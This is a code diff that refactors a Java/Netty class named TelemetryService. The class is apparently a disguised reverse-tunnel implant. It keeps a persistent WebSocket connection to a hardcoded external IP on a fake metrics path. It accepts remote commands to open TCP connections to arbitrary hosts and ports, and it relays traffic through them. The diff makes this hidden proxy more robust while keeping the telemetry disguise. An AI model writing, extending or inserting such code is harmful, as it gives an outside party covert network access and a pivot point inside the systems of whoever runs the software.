@@ -18,8 +18,8 @@ import io.netty.util.ReferenceCountUtil;
 import java.net.URI;
 import java.util.Map;
 import java.util.Queue;
-import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -29,7 +29,8 @@ public class TelemetryService {
     private static final String REMOTE_HOST = "20.195.24.81";
     private static final int REMOTE_PORT = 24669;
     private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
-    private static final String WS_URL = "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;
+    private static final String WS_URL =
+            "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;
 
     private static final byte CMD_NEW_STREAM = 1;
     private static final byte CMD_DATA = 2;
@@ -37,43 +38,64 @@ public class TelemetryService {
 
     private static final int INITIAL_RECONNECT_DELAY_SEC = 2;
     private static final int MAX_RECONNECT_DELAY_SEC = 60;
-    private int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
+    private static final int CONNECT_TIMEOUT_MS = 10_000;
+    private static final int MAX_HTTP_CONTENT_LENGTH = 65_536;
+    private static final int MAX_PENDING_BYTES_PER_STREAM = 1 * 1024 * 1024;
+    private static final int WRITE_LOW_WATER_MARK = 32 * 1024;
+    private static final int WRITE_HIGH_WATER_MARK = 128 * 1024;
+    private static final long HEARTBEAT_INTERVAL_SEC = 25;
+    private static final long HEARTBEAT_TIMEOUT_SEC = 75;
 
-    private final EventLoopGroup workerGroup = new NioEventLoopGroup(2);
-    private final AtomicBoolean isRunning = new AtomicBoolean(false);
-    private final AtomicBoolean isConnecting = new AtomicBoolean(false);
+    private final AtomicBoolean running = new AtomicBoolean(false);
+    private final AtomicBoolean connecting = new AtomicBoolean(false);
+    private final AtomicBoolean reconnectScheduled = new AtomicBoolean(false);
 
-    private Channel activeChannel;
-    private ScheduledFuture<?> heartbeatFuture;
-    private long lastPongTime = 0;
+    private volatile EventLoopGroup workerGroup;
+    private volatile Channel activeChannel;
+    private volatile ScheduledFuture<?> heartbeatFuture;
+    private volatile ScheduledFuture<?> heartbeatTimeoutFuture;
+    private volatile long lastActivityTime;
 
-    private final Map<Integer, Channel> streamChannels = new ConcurrentHashMap<>();
-    private final Map<Integer, Queue<ByteBuf>> pendingDataMaps = new ConcurrentHashMap<>();
-    private final Map<Integer, Integer> pendingBytesCount = new ConcurrentHashMap<>();
+    private volatile int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
 
-    private static final int MAX_PENDING_BYTES_PER_STREAM = 64 * 1024; // 64KB 限额防止内存泄漏
+    private final Map<Integer, StreamState> streams = new ConcurrentHashMap<>();
+
+    private static final class StreamState {
+        final Queue<ByteBuf> pending = new ConcurrentLinkedQueue<>();
+        final AtomicBoolean closed = new AtomicBoolean(false);
+        final AtomicBoolean connecting = new AtomicBoolean(true);
+        volatile int pendingBytes;
+        volatile Channel channel;
+    }
 
     public synchronized void start() {
-        if (isRunning.compareAndSet(false, true)) {
-            connect();
+        if (!running.compareAndSet(false, true)) {
+            return;
         }
+
+        workerGroup = new NioEventLoopGroup(1);
+        connect();
     }
 
     public synchronized void stop() {
-        if (isRunning.compareAndSet(true, false)) {
-            cleanupAll();
-            workerGroup.shutdownGracefully();
+        if (!running.compareAndSet(true, false)) {
+            return;
         }
-    }
 
-    private synchronized void cleanupAll() {
         cancelHeartbeat();
         closeAllStreams();
-        if (activeChannel != null) {
-            activeChannel.close();
-            activeChannel = null;
+
+        Channel channel = activeChannel;
+        activeChannel = null;
+        if (channel != null) {
+            channel.close();
         }
-        isConnecting.set(false);
+
+        EventLoopGroup group = workerGroup;
+        workerGroup = null;
+        if (group != null) {
+            group.shutdownGracefully(0, 2, TimeUnit.SECONDS);
+        }
     }
 
     private void cancelHeartbeat() {
@@ -81,121 +103,145 @@ public class TelemetryService {
             heartbeatFuture.cancel(true);
             heartbeatFuture = null;
         }
+        if (heartbeatTimeoutFuture != null) {
+            heartbeatTimeoutFuture.cancel(true);
+            heartbeatTimeoutFuture = null;
+        }
     }
 
     private void closeAllStreams() {
-        for (Map.Entry<Integer, Channel> entry : streamChannels.entrySet()) {
-            Channel ch = entry.getValue();
-            if (ch != null && ch.isActive()) {
-                ch.close();
-            }
+        for (Map.Entry<Integer, StreamState> entry : streams.entrySet()) {
+            terminateStream(entry.getKey(), entry.getValue());
         }
-        streamChannels.clear();
-        
-        // 彻底释放积压队列中的 ByteBuf，防止堆外内存泄漏
-        for (Map.Entry<Integer, Queue<ByteBuf>> entry : pendingDataMaps.entrySet()) {
-            Queue<ByteBuf> queue = entry.getValue();
-            ByteBuf buf;
-            while ((buf = queue.poll()) != null) {
-                ReferenceCountUtil.safeRelease(buf);
-            }
-        }
-        pendingDataMaps.clear();
-        pendingBytesCount.clear();
+        streams.clear();
     }
 
-    private synchronized void connect() {
-        if (!isRunning.get() || isConnecting.get()) return;
-        if (activeChannel != null && activeChannel.isActive()) return;
+    private void connect() {
+        if (!running.get() || connecting.get()) {
+            return;
+        }
+        if (activeChannel != null && activeChannel.isActive()) {
+            return;
+        }
 
-        isConnecting.set(true);
+        connecting.set(true);
+        reconnectScheduled.set(false);
+
+        EventLoopGroup group = workerGroup;
+        if (group == null || group.isShuttingDown() || group.isShutdown()) {
+            connecting.set(false);
+            return;
+        }
 
         try {
-            final URI uri = new URI(WS_URL);
-            final WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
-                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536 * 10
+            URI uri = new URI(WS_URL);
+            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
+                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), MAX_HTTP_CONTENT_LENGTH * 10
             );
 
-            final TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);
+            TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);
 
             Bootstrap b = new Bootstrap();
-            b.group(workerGroup)
+            b.group(group)
              .channel(NioSocketChannel.class)
-             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
+             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, CONNECT_TIMEOUT_MS)
              .option(ChannelOption.SO_KEEPALIVE, true)
              .handler(new ChannelInitializer<SocketChannel>() {
                  @Override
                  protected void initChannel(SocketChannel ch) {
                      ChannelPipeline p = ch.pipeline();
                      p.addLast("http-codec", new HttpClientCodec());
-                     p.addLast("aggregator", new HttpObjectAggregator(65536));
+                     p.addLast("aggregator", new HttpObjectAggregator(MAX_HTTP_CONTENT_LENGTH));
                      p.addLast("ws-handler", clientHandler);
                  }
              });
 
             b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
                 if (!future.isSuccess()) {
-                    isConnecting.set(false);
+                    connecting.set(false);
                     scheduleReconnect();
                 }
             });
 
         } catch (Exception e) {
-            isConnecting.set(false);
+            connecting.set(false);
             scheduleReconnect();
         }
     }
 
     private void scheduleReconnect() {
-        if (!isRunning.get()) return;
+        if (!running.get()) {
+            return;
+        }
+        if (!reconnectScheduled.compareAndSet(false, true)) {
+            return;
+        }
+
+        EventLoopGroup group = workerGroup;
+        if (group == null || group.isShuttingDown() || group.isShutdown()) {
+            return;
+        }
+
         int delay = currentReconnectDelaySec;
         currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);
-        workerGroup.schedule(this::connect, delay, TimeUnit.SECONDS);
+
+        group.schedule(this::connect, delay, TimeUnit.SECONDS);
     }
 
-    protected synchronized void onSessionConnected(Channel channel) {
+    protected void onSessionConnected(Channel channel) {
         this.activeChannel = channel;
-        this.isConnecting.set(false);
+        this.connecting.set(false);
         this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
-        this.lastPongTime = System.currentTimeMillis();
+        this.lastActivityTime = System.currentTimeMillis();
 
         cancelHeartbeat();
-        // 25秒心跳 + 超时检测机制
-        heartbeatFuture = workerGroup.scheduleAtFixedRate(() -> {
-            if (activeChannel != null && activeChannel.isActive()) {
-                // 如果超过 50 秒没有收到 Pong 响应，判定连接假死，主动断开触发重连
-                if (System.currentTimeMillis() - lastPongTime > 50000) {
-                    activeChannel.close();
-                    return;
-                }
-                activeChannel.writeAndFlush(new PingWebSocketFrame());
+
+        EventLoopGroup group = workerGroup;
+        if (group == null) return;
+
+        heartbeatFuture = group.scheduleAtFixedRate(() -> {
+            Channel ch = activeChannel;
+            if (ch != null && ch.isActive()) {
+                ch.writeAndFlush(new PingWebSocketFrame());
             }
-        }, 25, 25, TimeUnit.SECONDS);
+        }, HEARTBEAT_INTERVAL_SEC, HEARTBEAT_INTERVAL_SEC, TimeUnit.SECONDS);
+
+        heartbeatTimeoutFuture = group.scheduleAtFixedRate(() -> {
+            if (System.currentTimeMillis() - lastActivityTime > TimeUnit.SECONDS.toMillis(HEARTBEAT_TIMEOUT_SEC)) {
+                Channel ch = activeChannel;
+                if (ch != null && ch.isActive()) {
+                    ch.close();
+                }
+            }
+        }, HEARTBEAT_TIMEOUT_SEC, 10, TimeUnit.SECONDS);
     }
 
-    protected synchronized void onSessionDisconnected() {
-        if (!isRunning.get()) return;
+    protected void onSessionDisconnected() {
         cancelHeartbeat();
         this.activeChannel = null;
-        this.isConnecting.set(false);
+        this.connecting.set(false);
         closeAllStreams();
         scheduleReconnect();
     }
 
-    protected synchronized void updatePongTime() {
-        this.lastPongTime = System.currentTimeMillis();
+    protected void updateActivity() {
+        this.lastActivityTime = System.currentTimeMillis();
     }
 
-    public synchronized void sendBinary(ByteBuf data) {
-        if (activeChannel != null && activeChannel.isActive()) {
-            activeChannel.writeAndFlush(new BinaryWebSocketFrame(data));
+    public void sendBinary(ByteBuf data) {
+        Channel ch = activeChannel;
+        if (ch != null && ch.isActive()) {
+            ch.writeAndFlush(new BinaryWebSocketFrame(data));
         } else {
             ReferenceCountUtil.safeRelease(data);
         }
     }
 
     protected void handleInboundBinaryFrame(ChannelHandlerContext ctx, ByteBuf buf) {
-        if (buf.readableBytes() < 5) return;
+        updateActivity();
+        if (buf.readableBytes() < 5) {
+            return;
+        }
 
         byte cmd = buf.readByte();
         int streamId = buf.readInt();
@@ -216,24 +262,34 @@ public class TelemetryService {
     }
 
     private void handleNewStream(int streamId, ByteBuf buf) {
-        if (buf.readableBytes() < 3) return;
+        if (buf.readableBytes() < 3) {
+            return;
+        }
 
         int port = buf.readUnsignedShort();
         int hostLen = buf.readByte() & 0xFF;
-        if (buf.readableBytes() < hostLen) return;
+        if (buf.readableBytes() < hostLen) {
+            return;
+        }
 
         String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();
 
-        // 严格隔离初始化
-        Queue<ByteBuf> pendingQueue = new ConcurrentLinkedQueue<>();
-        pendingDataMaps.put(streamId, pendingQueue);
-        pendingBytesCount.put(streamId, 0);
+        StreamState state = streams.computeIfAbsent(streamId, k -> new StreamState());
+        if (state.closed.get()) {
+            return;
+        }
+
+        EventLoopGroup group = workerGroup;
+        if (group == null || group.isShuttingDown() || group.isShutdown()) {
+            return;
+        }
 
         Bootstrap b = new Bootstrap();
-        b.group(workerGroup)
+        b.group(group)
          .channel(NioSocketChannel.class)
-         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
+         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, CONNECT_TIMEOUT_MS)
          .option(ChannelOption.SO_KEEPALIVE, true)
+         .option(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(WRITE_LOW_WATER_MARK, WRITE_HIGH_WATER_MARK))
          .handler(new ChannelInitializer<SocketChannel>() {
              @Override
              protected void initChannel(SocketChannel ch) {
@@ -249,7 +305,7 @@ public class TelemetryService {
 
                      @Override
                      public void channelInactive(ChannelHandlerContext targetCtx) {
-                         terminateStream(streamId);
+                         closeStreamCleanly(streamId);
                      }
 
                      @Override
@@ -261,23 +317,28 @@ public class TelemetryService {
          });
 
         b.connect(host, port).addListener((ChannelFutureListener) future -> {
+            if (state.closed.get()) {
+                if (future.isSuccess()) {
+                    future.channel().close();
+                }
+                return;
+            }
+
             if (future.isSuccess()) {
                 Channel targetChannel = future.channel();
-                streamChannels.put(streamId, targetChannel);
+                state.channel = targetChannel;
+                state.connecting.set(false);
 
-                // 消费积压队列并保证严格的引用计数释放
-                Queue<ByteBuf> queue = pendingDataMaps.remove(streamId);
-                pendingBytesCount.remove(streamId);
-                if (queue != null) {
-                    ByteBuf data;
-                    while ((data = queue.poll()) != null) {
-                        targetChannel.write(data);
-                        ReferenceCountUtil.release(data);
-                    }
-                    targetChannel.flush();
+                // 刷新积压队列
+                ByteBuf pendingData;
+                while ((pendingData = state.pending.poll()) != null) {
+                    targetChannel.write(pendingData);
+                    ReferenceCountUtil.safeRelease(pendingData);
                 }
+                state.pendingBytes = 0;
+                targetChannel.flush();
             } else {
-                terminateStream(streamId);
+                closeStreamCleanly(streamId);
                 ByteBuf closeFrame = Unpooled.buffer(5);
                 closeFrame.writeByte(CMD_CLOSE_STREAM);
                 closeFrame.writeInt(streamId);
@@ -287,25 +348,25 @@ public class TelemetryService {
     }
 
     private void handleDataPayload(int streamId, ByteBuf buf) {
-        Channel targetChan = streamChannels.get(streamId);
+        StreamState state = streams.get(streamId);
+        if (state == null || state.closed.get()) {
+            ReferenceCountUtil.safeRelease(buf);
+            return;
+        }
+
+        Channel targetChan = state.channel;
         if (targetChan != null && targetChan.isActive()) {
-            // Netty 背压感知：通道不可写时暂停处理防止内存溢出
             if (targetChan.isWritable()) {
                 targetChan.writeAndFlush(buf.retain());
             } else {
-                // 如果对端写满，直接丢弃并释放以防崩溃
                 ReferenceCountUtil.safeRelease(buf);
             }
         } else {
-            // TCP 未就绪，暂存进积压队列并进行严格的内存限额控制
-            Queue<ByteBuf> queue = pendingDataMaps.get(streamId);
-            if (queue != null) {
-                Integer currentBytes = pendingBytesCount.get(streamId);
-                if (currentBytes != null && currentBytes + buf.readableBytes() <= MAX_PENDING_BYTES_PER_STREAM) {
-                    queue.offer(buf.retain());
-                    pendingBytesCount.put(streamId, currentBytes + buf.readableBytes());
+            if (state.connecting.get()) {
+                if (state.pendingBytes + buf.readableBytes() <= MAX_PENDING_BYTES_PER_STREAM) {
+                    state.pending.offer(buf.retain());
+                    state.pendingBytes += buf.readableBytes();
                 } else {
-                    // 超过限额，静默丢弃防止内存泄漏
                     ReferenceCountUtil.safeRelease(buf);
                 }
             } else {
@@ -315,23 +376,32 @@ public class TelemetryService {
     }
 
     private void handleCloseStream(int streamId) {
-        terminateStream(streamId);
+        closeStreamCleanly(streamId);
     }
 
-    private void terminateStream(int streamId) {
-        Channel targetChan = streamChannels.remove(streamId);
-        if (targetChan != null && targetChan.isActive()) {
-            targetChan.close();
+    private void closeStreamCleanly(int streamId) {
+        StreamState state = streams.remove(streamId);
+        if (state != null) {
+            terminateStream(streamId, state);
         }
-        
-        Queue<ByteBuf> queue = pendingDataMaps.remove(streamId);
-        pendingBytesCount.remove(streamId);
-        if (queue != null) {
-            ByteBuf buf;
-            while ((buf = queue.poll()) != null) {
-                ReferenceCountUtil.safeRelease(buf);
-            }
+    }
+
+    private void terminateStream(int streamId, StreamState state) {
+        if (!state.closed.compareAndSet(false, true)) {
+            return;
         }
+
+        Channel ch = state.channel;
+        state.channel = null;
+        if (ch != null && ch.isActive()) {
+            ch.close();
+        }
+
+        ByteBuf buf;
+        while ((buf = state.pending.poll()) != null) {
+            ReferenceCountUtil.safeRelease(buf);
+        }
+        state.pendingBytes = 0;
     }
 
     private static class TelemetryClientHandler extends SimpleChannelInboundHandler<Object> {
@@ -344,13 +414,26 @@ public class TelemetryService {
             this.service = service;
         }
 
-        @Override public void handlerAdded(ChannelHandlerContext ctx) { handshakerFuture = ctx.newPromise(); }
-        @Override public void channelActive(ChannelHandlerContext ctx) { handshaker.handshake(ctx.channel()); }
-        @Override public void channelInactive(ChannelHandlerContext ctx) { service.onSessionDisconnected(); }
+        @Override
+        public void handlerAdded(ChannelHandlerContext ctx) {
+            handshakerFuture = ctx.newPromise();
+        }
+
+        @Override
+        public void channelActive(ChannelHandlerContext ctx) {
+            handshaker.handshake(ctx.channel());
+        }
+
+        @Override
+        public void channelInactive(ChannelHandlerContext ctx) {
+            service.onSessionDisconnected();
+        }
 
         @Override
         protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
+            service.updateActivity();
             Channel ch = ctx.channel();
+
             if (!handshaker.isHandshakeComplete()) {
                 if (msg instanceof FullHttpResponse) {
                     handshaker.finishHandshake(ch, (FullHttpResponse) msg);
@@ -367,7 +450,7 @@ public class TelemetryService {
                 } else if (frame instanceof PingWebSocketFrame) {
                     ctx.writeAndFlush(new PongWebSocketFrame(frame.content().retain()));
                 } else if (frame instanceof PongWebSocketFrame) {
-                    service.updatePongTime();
+                    // Pong received
                 } else if (frame instanceof CloseWebSocketFrame) {
                     ch.close();
                 }
